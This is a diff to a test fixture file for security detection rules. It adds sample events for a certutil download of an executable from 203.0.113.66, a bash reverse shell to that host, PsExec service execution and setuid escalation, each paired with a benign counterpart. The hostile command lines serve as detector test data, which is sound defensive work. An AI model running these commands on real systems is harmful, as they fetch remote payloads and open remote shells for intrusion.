@@ -169,9 +169,25 @@ RULE_FIXTURES = {
         {"command_line": "powershell Get-ChildItem C:\\Users"},
     ),
     "privilege_escalation": (
-        "selection_sudo",
+        # selection_sudo was removed: every routine sudo alerted (Phase 1).
+        "selection_setuid",
+        {"syscall": "setuid", "success": "yes"},
         {"event_type": "sudo", "result": "success"},
-        {"event_type": "login", "result": "success"},
+    ),
+    "command_and_control_ingress_tool_transfer": (
+        "selection_certutil",
+        {"command_line": "certutil.exe -urlcache -split -f http://203.0.113.66/p.exe p.exe"},
+        {"command_line": "certutil.exe -hashfile setup.exe SHA256"},
+    ),
+    "execution_unix_reverse_shell": (
+        "selection",
+        {"command_line": "bash -i >& /dev/tcp/203.0.113.66/4444 0>&1"},
+        {"command_line": "bash /opt/app/healthcheck.sh"},
+    ),
+    "execution_remote_service": (
+        "selection_psexesvc",
+        {"process_name": "C:\\Windows\\PSEXESVC.exe"},
+        {"process_name": "C:\\Windows\\System32\\services.exe"},
     ),
     "data_exfiltration": (
         "selection_suspicious_protocols",
